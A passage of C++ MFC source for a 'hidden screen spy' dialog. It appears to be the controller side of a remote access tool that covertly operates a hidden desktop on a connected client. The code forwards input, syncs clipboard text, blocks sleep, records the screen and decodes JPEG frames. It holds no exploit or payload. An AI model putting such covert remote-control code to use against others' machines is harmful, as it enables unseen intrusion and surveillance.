        // 此逻辑会丢弃所有 非左键拖拽 的鼠标移动消息（如纯移动或右键拖拽）
        if (pMsg->message == WM_MOUSEMOVE && GetKeyState(VK_LBUTTON) >= 0)
            break;
        SendScaledMouseMessage(pMsg, true);
        return TRUE;
    }
    case WM_CHAR: {
        // 检查给定字符是否为控制字符
		if (iswcntrl(static_cast<wint_t>(pMsg->wParam))) {
			break;
		}
        SendScaledMouseMessage(pMsg);
        return TRUE;
    }
    case WM_KEYDOWN: case WM_KEYUP: {
        SendScaledMouseMessage(pMsg);
        return TRUE;
    }
    }
    // 屏蔽Enter和ESC关闭对话
    if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_RETURN))
        return TRUE;

    return CDialog::PreTranslateMessage(pMsg);
}

void CHideScreenSpyDlg::SendScaledMouseMessage(MSG* pMsg, bool makeLP) {
	if (!m_bIsCtrl)
		return;

    MYMSG msg(*pMsg);
	auto low = ((LONG)LOWORD(pMsg->lParam)) * m_wZoom;
	auto high = ((LONG)HIWORD(pMsg->lParam)) * m_hZoom;
    if(makeLP) msg.lParam = MAKELPARAM(low, high);
	msg.pt.x = (int)(low + m_rect.left);
	msg.pt.y = (int)(high + m_rect.top);
	SendCommand(msg);
}

void CHideScreenSpyDlg::SendCommand(const MYMSG& pMsg)
{
    if (!m_bIsCtrl) {
        return;
    }

    LPBYTE lpData = new BYTE[sizeof(MYMSG) + 1];
    lpData[0] = COMMAND_SCREEN_CONTROL;
    memcpy(lpData + 1, &pMsg, sizeof(MYMSG));
    m_iocpServer->Send2Client(m_ContextObject, lpData, sizeof(MYMSG) + 1);

    SAFE_DELETE_ARRAY(lpData);
}

void CHideScreenSpyDlg::UpdateServerClipboard(char* buf, int len)
{
    if (!::OpenClipboard(NULL))
        return;

    ::EmptyClipboard();
    HGLOBAL hglbCopy = GlobalAlloc(GMEM_MOVEABLE, len);
    if (hglbCopy != NULL) {
        // Lock the handle and copy the text to the buffer.
        LPTSTR lptstrCopy = (LPTSTR)GlobalLock(hglbCopy);
        memcpy(lptstrCopy, buf, len);
        GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.
        SetClipboardData(CF_TEXT, hglbCopy);
        GlobalFree(hglbCopy);
    }
    CloseClipboard();
}

void CHideScreenSpyDlg::SendServerClipboard()
{
    if (!::OpenClipboard(NULL))
        return;
    HGLOBAL hglb = GetClipboardData(CF_TEXT);
    if (hglb == NULL) {
        ::CloseClipboard();
        return;
    }
    int	nPacketLen = GlobalSize(hglb) + 1;
    LPSTR lpstr = (LPSTR)GlobalLock(hglb);
    LPBYTE	lpData = new BYTE[nPacketLen];
    lpData[0] = COMMAND_SCREEN_SET_CLIPBOARD;
    memcpy(lpData + 1, lpstr, nPacketLen - 1);
    ::GlobalUnlock(hglb);
    ::CloseClipboard();
    m_iocpServer->Send2Client(m_ContextObject, lpData, nPacketLen);
    delete[] lpData;
}

void CHideScreenSpyDlg::DoPaint()
{
    if (m_bIsFirst) {
        DrawTipString(m_strTip);
        return;
    }
    if (m_bIsClosed) return;
    StretchBlt(m_hFullDC, 0, 0, m_CRect.Width(), m_CRect.Height(), m_hFullMemDC, 0, 0, m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight, SRCCOPY);
    // Do not call CDialog::OnPaint() for painting messages
}

void CHideScreenSpyDlg::OnPaint()
{
    CPaintDC dc(this);

    if (m_bIsFirst) {
        DrawTipString(m_strTip);
        return;
    }
    if (m_bIsClosed) return;
    StretchBlt(m_hFullDC, 0, 0, m_CRect.Width(), m_CRect.Height(), m_hFullMemDC, 0, 0, m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight, SRCCOPY);
    CDialog::OnPaint();
}

LRESULT CHideScreenSpyDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
{
    // TODO: Add your specialized code here and/or call the base class
    if (message == WM_POWERBROADCAST && wParam == PBT_APMQUERYSUSPEND) {
        return BROADCAST_QUERY_DENY; // 拦截系统待机, 休眠的请求
    }
    if (message == WM_ACTIVATE && LOWORD(wParam) != WA_INACTIVE && !HIWORD(wParam)) {
        SetWindowPos(&wndTopMost, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
        return TRUE;
    }
    if (message == WM_ACTIVATE && LOWORD(wParam) == WA_INACTIVE) {
        SetWindowPos(&wndNoTopMost, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
        return TRUE;
    }

    return CDialog::WindowProc(message, wParam, lParam);
}

void CHideScreenSpyDlg::OnTimer(UINT_PTR nIDEvent)
{
    if (!m_aviFile.IsEmpty()) {
        LPCTSTR	lpTipsString = _T("●");

        m_aviStream.Write(m_BitmapData_Full);

        // 提示正在录像
        SetTextColor(m_hFullDC, RGB(0xff, 0x00, 0x00));
        TextOut(m_hFullDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
    }
    CDialog::OnTimer(nIDEvent);
}

bool CHideScreenSpyDlg::JPG_BMP(int cbit, void* input, int inlen, void* output)
{
    struct jpeg_decompress_struct jds;
    struct jpeg_error_mgr jem;

    // 设置错误处理
    jds.err = jpeg_std_error(&jem);
    // 创建解压结构
    jpeg_create_decompress(&jds);
    // 设置读取(输入)位置
    jpeg_mem_src(&jds, (byte*)input, inlen);
    // 读取头部信息
    if (jpeg_read_header(&jds, true) != JPEG_HEADER_OK) {
        jpeg_destroy_decompress(&jds);
        return false;
    }
    // 设置相关参数
    switch (cbit) {
    case 16:
        jds.out_color_space = JCS_EXT_RGB;
        break;
    case 24:
        jds.out_color_space = JCS_EXT_BGR;
        break;
    case 32:
        jds.out_color_space = JCS_EXT_BGRA;
        break;
    default:
        jpeg_destroy_decompress(&jds);
        return false;
    }
    // 开始解压图像
    if (!jpeg_start_decompress(&jds)) {
        jpeg_destroy_decompress(&jds);
        return false;
    }
    int line_stride = (jds.output_width * cbit / 8 + 3) / 4 * 4;
    while (jds.output_scanline < jds.output_height) {
        byte* pline = (byte*)output + jds.output_scanline * line_stride;
        jpeg_read_scanlines(&jds, &pline, 1);
    }
    // 完成图像解压
    if (!jpeg_finish_decompress(&jds)) {
        jpeg_destroy_decompress(&jds);
        return false;
    }
    // 释放相关资源
    jpeg_destroy_decompress(&jds);

    return true;
}
